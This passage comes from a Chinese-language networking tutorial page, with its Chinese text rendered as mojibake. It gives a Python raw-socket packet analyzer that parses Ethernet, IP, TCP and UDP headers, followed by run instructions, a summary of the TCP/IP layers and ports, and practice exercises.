class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day04_packet_analyzer.py</span><br><span class="hljs-comment"># åŠŸèƒ½ï¼šæ•è·å¹¶åˆ†æç½‘ç»œæ•°æ®åŒ…ï¼ˆTCP/IPå„å±‚ä¿¡æ¯ï¼‰</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> textwrap<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ethernet_frame</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    è§£æä»¥å¤ªç½‘å¸§ï¼ˆç½‘ç»œæ¥å£å±‚ï¼‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">    ä»¥å¤ªç½‘å¸§æ ¼å¼ï¼š</span><br><span class="hljs-string">    [ç›®æ ‡MAC(6å­—èŠ‚) | æºMAC(6å­—èŠ‚) | ç±»å‹(2å­—èŠ‚) | æ•°æ® | CRC(4å­—èŠ‚)]</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># æå–MACåœ°å€å’Œç±»å‹</span><br>    dest_mac, src_mac, eth_type = struct.unpack(<span class="hljs-string">&#x27;! 6s 6s H&#x27;</span>, data[:<span class="hljs-number">14</span>])<br><br>    <span class="hljs-comment"># æ ¼å¼åŒ–MACåœ°å€</span><br>    dest_mac = <span class="hljs-string">&#x27;:&#x27;</span>.join(<span class="hljs-string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(b) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> dest_mac)<br>    src_mac = <span class="hljs-string">&#x27;:&#x27;</span>.join(<span class="hljs-string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(b) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> src_mac)<br><br>    <span class="hljs-comment"># ä»¥å¤ªç½‘ç±»å‹</span><br>    <span class="hljs-comment"># 0x0800 = IPv4, 0x86DD = IPv6, 0x0806 = ARP</span><br>    eth_type = socket.htons(eth_type)<br><br>    <span class="hljs-comment"># è¿”å›MACåœ°å€ã€ç±»å‹å’Œå‰©ä½™æ•°æ®</span><br>    <span class="hljs-keyword">return</span> dest_mac, src_mac, eth_type, data[<span class="hljs-number">14</span>:]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ipv4_packet</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    è§£æIPv4æ•°æ®åŒ…ï¼ˆç½‘é™…å±‚ï¼‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">    IPv4å¤´éƒ¨æ ¼å¼ï¼ˆ20å­—èŠ‚ï¼‰ï¼š</span><br><span class="hljs-string">    [ç‰ˆæœ¬+å¤´é•¿(1) | æœåŠ¡ç±»å‹(1) | æ€»é•¿åº¦(2) | æ ‡è¯†(2) | æ ‡å¿—+åç§»(2) |</span><br><span class="hljs-string">     TTL(1) | åè®®(1) | æ ¡éªŒå’Œ(2) | æºIP(4) | ç›®æ ‡IP(4)]</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># è§£æIPv4å¤´éƒ¨çš„å‰20å­—èŠ‚</span><br>    version_header_length = data[<span class="hljs-number">0</span>]<br>    version = version_header_length &gt;&gt; <span class="hljs-number">4</span>  <span class="hljs-comment"># é«˜4ä½æ˜¯ç‰ˆæœ¬</span><br>    header_length = (version_header_length &amp; <span class="hljs-number">15</span>) * <span class="hljs-number">4</span>  <span class="hljs-comment"># ä½4ä½æ˜¯å¤´é•¿ï¼ˆå•ä½ï¼š4å­—èŠ‚ï¼‰</span><br><br>    <span class="hljs-comment"># æå–TTLã€åè®®ã€æºIPã€ç›®æ ‡IP</span><br>    ttl, proto, src, target = struct.unpack(<span class="hljs-string">&#x27;! 8x B B 2x 4s 4s&#x27;</span>, data[:<span class="hljs-number">20</span>])<br><br>    <span class="hljs-comment"># æ ¼å¼åŒ–IPåœ°å€</span><br>    src_ip = <span class="hljs-string">&#x27;.&#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, src))<br>    target_ip = <span class="hljs-string">&#x27;.&#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, target))<br><br>    <span class="hljs-comment"># åè®®å·å¯¹åº”çš„åè®®å</span><br>    protocols = &#123;<span class="hljs-number">1</span>: <span class="hljs-string">&#x27;ICMP&#x27;</span>, <span class="hljs-number">6</span>: <span class="hljs-string">&#x27;TCP&#x27;</span>, <span class="hljs-number">17</span>: <span class="hljs-string">&#x27;UDP&#x27;</span>&#125;<br>    proto_name = protocols.get(proto, <span class="hljs-string">f&#x27;Other(<span class="hljs-subst">&#123;proto&#125;</span>)&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> version, header_length, ttl, proto_name, src_ip, target_ip, data[header_length:]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tcp_segment</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    è§£æTCPæ®µï¼ˆä¼ è¾“å±‚ï¼‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">    TCPå¤´éƒ¨æ ¼å¼ï¼ˆè‡³å°‘20å­—èŠ‚ï¼‰ï¼š</span><br><span class="hljs-string">    [æºç«¯å£(2) | ç›®æ ‡ç«¯å£(2) | åºå·(4) | ç¡®è®¤å·(4) |</span><br><span class="hljs-string">     å¤´é•¿+æ ‡å¿—(2) | çª—å£(2) | æ ¡éªŒå’Œ(2) | ç´§æ€¥æŒ‡é’ˆ(2)]</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    src_port, dest_port, sequence, acknowledgment, offset_reserved_flags = struct.unpack(<br>        <span class="hljs-string">&#x27;! H H L L H&#x27;</span>, data[:<span class="hljs-number">14</span>]<br>    )<br><br>    <span class="hljs-comment"># æå–å¤´éƒ¨é•¿åº¦ï¼ˆé«˜4ä½ï¼‰</span><br>    offset = (offset_reserved_flags &gt;&gt; <span class="hljs-number">12</span>) * <span class="hljs-number">4</span><br><br>    <span class="hljs-comment"># æå–TCPæ ‡å¿—ä½</span><br>    flag_urg = (offset_reserved_flags &amp; <span class="hljs-number">32</span>) &gt;&gt; <span class="hljs-number">5</span><br>    flag_ack = (offset_reserved_flags &amp; <span class="hljs-number">16</span>) &gt;&gt; <span class="hljs-number">4</span><br>    flag_psh = (offset_reserved_flags &amp; <span class="hljs-number">8</span>) &gt;&gt; <span class="hljs-number">3</span><br>    flag_rst = (offset_reserved_flags &amp; <span class="hljs-number">4</span>) &gt;&gt; <span class="hljs-number">2</span><br>    flag_syn = (offset_reserved_flags &amp; <span class="hljs-number">2</span>) &gt;&gt; <span class="hljs-number">1</span><br>    flag_fin = offset_reserved_flags &amp; <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">return</span> src_port, dest_port, sequence, acknowledgment, flag_urg, flag_ack, \<br>           flag_psh, flag_rst, flag_syn, flag_fin, data[offset:]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">udp_segment</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    è§£æUDPæ®µï¼ˆä¼ è¾“å±‚ï¼‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">    UDPå¤´éƒ¨æ ¼å¼ï¼ˆ8å­—èŠ‚ï¼‰ï¼š</span><br><span class="hljs-string">    [æºç«¯å£(2) | ç›®æ ‡ç«¯å£(2) | é•¿åº¦(2) | æ ¡éªŒå’Œ(2)]</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    src_port, dest_port, length = struct.unpack(<span class="hljs-string">&#x27;! H H 2x H&#x27;</span>, data[:<span class="hljs-number">8</span>])<br>    <span class="hljs-keyword">return</span> src_port, dest_port, length, data[<span class="hljs-number">8</span>:]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">format_multi_line</span>(<span class="hljs-params">prefix, string, size=<span class="hljs-number">80</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;æ ¼å¼åŒ–å¤šè¡Œè¾“å‡º&quot;&quot;&quot;</span><br>    size -= <span class="hljs-built_in">len</span>(prefix)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(string, <span class="hljs-built_in">bytes</span>):<br>        string = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">r&#x27;\x&#123;:02x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> string)<br>        <span class="hljs-keyword">if</span> size % <span class="hljs-number">2</span>:<br>            size -= <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\n&#x27;</span>.join([prefix + line <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> textwrap.wrap(string, size)])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ä¸»å‡½æ•°ï¼šæ•è·å¹¶åˆ†ææ•°æ®åŒ…</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">80</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;TCP/IPæ•°æ®åŒ…åˆ†æå™¨&quot;</span>.center(<span class="hljs-number">80</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">80</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nğŸ“¡ æ­£åœ¨ç›‘å¬ç½‘ç»œæ¥å£...&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ğŸ’¡ æç¤ºï¼šè®¿é—®ä¸€ä¸ªç½‘ç«™æˆ–pingä¸€ä¸ªåœ°å€æ¥ç”Ÿæˆæµé‡&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âš ï¸  æŒ‰Ctrl+Cåœæ­¢æ•è·\n&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">80</span>)<br><br>    <span class="hljs-comment"># åˆ›å»ºåŸå§‹å¥—æ¥å­—</span><br>    <span class="hljs-comment"># æ³¨æ„ï¼šåœ¨æŸäº›ç³»ç»Ÿä¸Šå¯èƒ½éœ€è¦rootæƒé™</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># Windows</span><br>        conn = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)<br>        conn.bind((<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">0</span>))<br>        conn.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, <span class="hljs-number">1</span>)<br>        conn.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)<br>    <span class="hljs-keyword">except</span> AttributeError:<br>        <span class="hljs-comment"># Linux/Mac</span><br>        conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(<span class="hljs-number">3</span>))<br><br>    packet_count = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-comment"># æ¥æ”¶æ•°æ®</span><br>            raw_data, addr = conn.recvfrom(<span class="hljs-number">65535</span>)<br>            packet_count += <span class="hljs-number">1</span><br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;â–¼&#x27;</span> * <span class="hljs-number">40</span>&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ“¦ æ•°æ®åŒ… #<span class="hljs-subst">&#123;packet_count&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;â–¼&#x27;</span> * <span class="hljs-number">40</span>&#125;</span>\n&quot;</span>)<br><br>            <span class="hljs-comment"># 1. è§£æä»¥å¤ªç½‘å¸§ï¼ˆç½‘ç»œæ¥å£å±‚ï¼‰</span><br>            <span class="hljs-keyword">try</span>:<br>                dest_mac, src_mac, eth_type, data = ethernet_frame(raw_data)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ”— ç½‘ç»œæ¥å£å±‚ï¼ˆä»¥å¤ªç½‘å¸§ï¼‰&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   æºMACåœ°å€: <span class="hljs-subst">&#123;src_mac&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   ç›®æ ‡MACåœ°å€: <span class="hljs-subst">&#123;dest_mac&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   åè®®ç±»å‹: 0x<span class="hljs-subst">&#123;eth_type:04x&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-comment"># æŸäº›ç³»ç»Ÿå¯èƒ½ä¸åŒ…å«ä»¥å¤ªç½‘å¤´</span><br>                eth_type = <span class="hljs-number">0x0800</span><br>                data = raw_data<br><br>            <span class="hljs-comment"># 2. è§£æIPæ•°æ®åŒ…ï¼ˆç½‘é™…å±‚ï¼‰</span><br>            <span class="hljs-keyword">if</span> eth_type == <span class="hljs-number">0x0800</span>:  <span class="hljs-comment"># IPv4</span><br>                version, header_length, ttl, proto, src_ip, target_ip, data = ipv4_packet(data)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nğŸŒ ç½‘é™…å±‚ï¼ˆIPæ•°æ®åŒ…ï¼‰&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   IPç‰ˆæœ¬: IPv<span class="hljs-subst">&#123;version&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   å¤´éƒ¨é•¿åº¦: <span class="hljs-subst">&#123;header_length&#125;</span>å­—èŠ‚&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   TTL: <span class="hljs-subst">&#123;ttl&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   åè®®: <span class="hljs-subst">&#123;proto&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   æºIPåœ°å€: <span class="hljs-subst">&#123;src_ip&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   ç›®æ ‡IPåœ°å€: <span class="hljs-subst">&#123;target_ip&#125;</span>&quot;</span>)<br><br>                <span class="hljs-comment"># 3. è§£æä¼ è¾“å±‚</span><br>                <span class="hljs-keyword">if</span> proto == <span class="hljs-string">&#x27;TCP&#x27;</span>:<br>                    src_port, dest_port, sequence, acknowledgment, flag_urg, flag_ack, \<br>                    flag_psh, flag_rst, flag_syn, flag_fin, data = tcp_segment(data)<br><br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nğŸšš ä¼ è¾“å±‚ï¼ˆTCPæ®µï¼‰&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   æºç«¯å£: <span class="hljs-subst">&#123;src_port&#125;</span>&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   ç›®æ ‡ç«¯å£: <span class="hljs-subst">&#123;dest_port&#125;</span>&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   åºåˆ—å·: <span class="hljs-subst">&#123;sequence&#125;</span>&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   ç¡®è®¤å·: <span class="hljs-subst">&#123;acknowledgment&#125;</span>&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   æ ‡å¿—ä½: &quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br><br>                    flags = []<br>                    <span class="hljs-keyword">if</span> flag_syn: flags.append(<span class="hljs-string">&quot;SYN&quot;</span>)<br>                    <span class="hljs-keyword">if</span> flag_ack: flags.append(<span class="hljs-string">&quot;ACK&quot;</span>)<br>                    <span class="hljs-keyword">if</span> flag_fin: flags.append(<span class="hljs-string">&quot;FIN&quot;</span>)<br>                    <span class="hljs-keyword">if</span> flag_rst: flags.append(<span class="hljs-string">&quot;RST&quot;</span>)<br>                    <span class="hljs-keyword">if</span> flag_psh: flags.append(<span class="hljs-string">&quot;PSH&quot;</span>)<br>                    <span class="hljs-keyword">if</span> flag_urg: flags.append(<span class="hljs-string">&quot;URG&quot;</span>)<br><br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;, &quot;</span>.join(flags) <span class="hljs-keyword">if</span> flags <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;æ— &quot;</span>)<br><br>                    <span class="hljs-comment"># 4. åº”ç”¨å±‚æ•°æ®</span><br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) &gt; <span class="hljs-number">0</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nğŸ“± åº”ç”¨å±‚æ•°æ®&quot;</span>)<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   æ•°æ®é•¿åº¦: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(data)&#125;</span>å­—èŠ‚&quot;</span>)<br><br>                        <span class="hljs-comment"># å°è¯•è§£æHTTP</span><br>                        <span class="hljs-keyword">try</span>:<br>                            data_str = data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>                            <span class="hljs-keyword">if</span> data_str.startswith(<span class="hljs-string">&#x27;HTTP&#x27;</span>) <span class="hljs-keyword">or</span> data_str.startswith(<span class="hljs-string">&#x27;GET&#x27;</span>) <span class="hljs-keyword">or</span> \<br>                               data_str.startswith(<span class="hljs-string">&#x27;POST&#x27;</span>):<br>                                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   åè®®: HTTP&quot;</span>)<br>                                lines = data_str.split(<span class="hljs-string">&#x27;\\r\\n&#x27;</span>)[:<span class="hljs-number">5</span>]  <span class="hljs-comment"># åªæ˜¾ç¤ºå‰5è¡Œ</span><br>                                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>                                    <span class="hljs-keyword">if</span> line:<br>                                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   <span class="hljs-subst">&#123;line&#125;</span>&quot;</span>)<br>                        <span class="hljs-keyword">except</span>:<br>                            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   æ•°æ®é¢„è§ˆ: <span class="hljs-subst">&#123;data[:<span class="hljs-number">50</span>]&#125;</span>&quot;</span>)<br><br>                <span class="hljs-keyword">elif</span> proto == <span class="hljs-string">&#x27;UDP&#x27;</span>:<br>                    src_port, dest_port, length, data = udp_segment(data)<br><br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nğŸ“¦ ä¼ è¾“å±‚ï¼ˆUDPæ®µï¼‰&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   æºç«¯å£: <span class="hljs-subst">&#123;src_port&#125;</span>&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   ç›®æ ‡ç«¯å£: <span class="hljs-subst">&#123;dest_port&#125;</span>&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   é•¿åº¦: <span class="hljs-subst">&#123;length&#125;</span>å­—èŠ‚&quot;</span>)<br><br>                    <span class="hljs-comment"># DNSæŸ¥è¯¢/å“åº”</span><br>                    <span class="hljs-keyword">if</span> src_port == <span class="hljs-number">53</span> <span class="hljs-keyword">or</span> dest_port == <span class="hljs-number">53</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   åº”ç”¨åè®®: DNS&quot;</span>)<br><br>                <span class="hljs-keyword">elif</span> proto == <span class="hljs-string">&#x27;ICMP&#x27;</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nğŸ“¡ ä¼ è¾“å±‚ï¼ˆICMPï¼‰&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   è¿™æ˜¯ä¸€ä¸ªpingæˆ–tracerouteæ•°æ®åŒ…&quot;</span>)<br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">80</span>)<br><br>            <span class="hljs-comment"># åªæ•è·å‰10ä¸ªåŒ…ä½œä¸ºæ¼”ç¤º</span><br>            <span class="hljs-keyword">if</span> packet_count &gt;= <span class="hljs-number">10</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nâœ… å·²æ•è·<span class="hljs-subst">&#123;packet_count&#125;</span>ä¸ªæ•°æ®åŒ…ï¼Œåœæ­¢ç›‘å¬&quot;</span>)<br>                <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n\nâœ‹ ç”¨æˆ·åœæ­¢æ•è·&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ“Š æ€»å…±æ•è·äº† <span class="hljs-subst">&#123;packet_count&#125;</span> ä¸ªæ•°æ®åŒ…&quot;</span>)<br><br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-comment"># Windowséœ€è¦å…³é—­æ··æ‚æ¨¡å¼</span><br>        <span class="hljs-keyword">try</span>:<br>            conn.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>        conn.close()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">80</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">import</span> sys<br>    <span class="hljs-keyword">if</span> sys.platform == <span class="hljs-string">&#x27;win32&#x27;</span> <span class="hljs-keyword">or</span> sys.platform == <span class="hljs-string">&#x27;linux&#x27;</span> <span class="hljs-keyword">or</span> sys.platform == <span class="hljs-string">&#x27;darwin&#x27;</span>:<br>        main()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âš ï¸  æ­¤ç¨‹åºå¯èƒ½éœ€è¦ç®¡ç†å‘˜/rootæƒé™&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ğŸ’¡ Linux/Mac: sudo python day04_packet_analyzer.py&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ğŸ’¡ Windows: ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="è¿è¡Œè¯´æ˜">è¿è¡Œè¯´æ˜</h3><p><strong>Linux/Mac</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> python code/day04/day04_packet_analyzer.py<br></code></pre></td></tr></table></figure><p><strong>Windows</strong>ï¼š<br>ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œå‘½ä»¤æç¤ºç¬¦ï¼Œç„¶åï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python code\day04\day04_packet_analyzer.py<br></code></pre></td></tr></table></figure><h3 id="é¢„æœŸè¾“å‡º">é¢„æœŸè¾“å‡º</h3><p>ç¨‹åºä¼šå®æ—¶æ˜¾ç¤ºæ•è·åˆ°çš„æ•°æ®åŒ…çš„å„å±‚ä¿¡æ¯ã€‚</p><h2 id="ğŸ“-çŸ¥è¯†å°ç»“">ğŸ“ çŸ¥è¯†å°ç»“</h2><h3 id="ä»Šå¤©å­¦åˆ°äº†ä»€ä¹ˆï¼Ÿ">ä»Šå¤©å­¦åˆ°äº†ä»€ä¹ˆï¼Ÿ</h3><ol><li>âœ… TCP/IPå››å±‚æ¨¡å‹æ˜¯å®é™…ä½¿ç”¨çš„ç½‘ç»œæ¨¡å‹</li><li>âœ… TCP/IPæ¯”OSIæ›´ç®€æ´å®ç”¨</li><li>âœ… æ¯ä¸€å±‚éƒ½æœ‰ç‰¹å®šçš„åè®®å’Œä½œç”¨</li><li>âœ… æ•°æ®åŒ…åŒ…å«å¤šå±‚çš„å¤´éƒ¨ä¿¡æ¯</li></ol><h3 id="TCP-IPå››å±‚å¯¹åº”è¡¨">TCP/IPå››å±‚å¯¹åº”è¡¨</h3><table><thead><tr><th>TCP/IPå±‚</th><th>ä¸»è¦åè®®</th><th>å…³é”®ä¿¡æ¯</th><th>è®¾å¤‡</th></tr></thead><tbody><tr><td>åº”ç”¨å±‚</td><td>HTTPã€DNSã€FTP</td><td>åº”ç”¨æ•°æ®</td><td>-</td></tr><tr><td>ä¼ è¾“å±‚</td><td>TCPã€UDP</td><td>ç«¯å£å·</td><td>-</td></tr><tr><td>ç½‘é™…å±‚</td><td>IPã€ICMP</td><td>IPåœ°å€</td><td>è·¯ç”±å™¨</td></tr><tr><td>ç½‘ç»œæ¥å£å±‚</td><td>Ethernetã€WiFi</td><td>MACåœ°å€</td><td>äº¤æ¢æœºã€ç½‘å¡</td></tr></tbody></table><h3 id="é‡è¦åè®®">é‡è¦åè®®</h3><p><strong>åº”ç”¨å±‚</strong>ï¼š</p><ul><li>HTTPï¼ˆ80ï¼‰ï¼šç½‘é¡µ</li><li>HTTPSï¼ˆ443ï¼‰ï¼šåŠ å¯†ç½‘é¡µ</li><li>DNSï¼ˆ53ï¼‰ï¼šåŸŸåè§£æ</li><li>FTPï¼ˆ21ï¼‰ï¼šæ–‡ä»¶ä¼ è¾“</li><li>SSHï¼ˆ22ï¼‰ï¼šè¿œç¨‹ç™»å½•</li><li>SMTPï¼ˆ25ï¼‰ï¼šå‘é€é‚®ä»¶</li></ul><p><strong>ä¼ è¾“å±‚</strong>ï¼š</p><ul><li>TCPï¼šå¯é ä¼ è¾“</li><li>UDPï¼šå¿«é€Ÿä¼ è¾“</li></ul><p><strong>ç½‘é™…å±‚</strong>ï¼š</p><ul><li>IPï¼šå¯»å€å’Œè·¯ç”±</li><li>ICMPï¼šé”™è¯¯æŠ¥å‘Šå’Œè¯Šæ–­</li></ul><p><strong>ç½‘ç»œæ¥å£å±‚</strong>ï¼š</p><ul><li>Ethernetï¼šæœ‰çº¿ç½‘ç»œ</li><li>WiFiï¼šæ— çº¿ç½‘ç»œ</li></ul><h2 id="ğŸ’ª-ç»ƒä¹ é¢˜">ğŸ’ª ç»ƒä¹ é¢˜</h2><h3 id="ç»ƒä¹ 1ï¼šåè®®è¯†åˆ«">ç»ƒä¹ 1ï¼šåè®®è¯†åˆ«</h3><p>ä»¥ä¸‹ç«¯å£å·å¯¹åº”ä»€ä¹ˆåè®®ï¼Ÿ</p><ol><li>80</li><li>443</li><li>22</li><li>3306</li><li>27017</li></ol><h3 id="ç»ƒä¹ 2ï¼šå±‚æ¬¡åˆ¤æ–­">ç»ƒä¹ 2ï¼šå±‚æ¬¡åˆ¤æ–­</h3><p>ä»¥ä¸‹ä¿¡æ¯åˆ†åˆ«å±äºå“ªä¸€å±‚ï¼Ÿ</p><ol><li>192.168.1.1</li><li>AA:BB:CC:DD:EE:FF</li><li>ç«¯å£8080</li><li>HTTP/1.1</li><li>TCPåºåˆ—å·12345</li></ol><h3 id="ç»ƒä¹ 3ï¼šç»˜åˆ¶æ•°æ®åŒ…ç»“æ„">ç»ƒä¹ 